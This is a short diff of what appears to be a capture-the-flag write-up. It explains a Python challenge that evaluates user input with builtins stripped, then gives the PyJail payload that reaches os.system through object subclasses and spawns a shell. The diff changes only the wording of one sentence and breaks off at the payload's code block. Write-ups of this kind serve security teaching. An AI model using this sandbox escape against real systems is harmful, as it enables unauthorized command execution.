@@ -39,7 +39,7 @@ if __name__ == "__main__":
 This code snippet prompts the user to enter a Python list as input, evaluates the input string as a Python expression, and assigns the resulting list to the variable lis, while restricting access to built-in functions and variables for security purposes.
 
 ## How to Solve?
-Im using PyJail payload to breakout from the sandbox. Here is the payload that I used
+Im using PyJail payload to breakout from the sandbox. Here is the payload I used
 
 ```
 ().__class__.__base__.__subclasses__()[141].__init__.__globals__["system"]("sh")
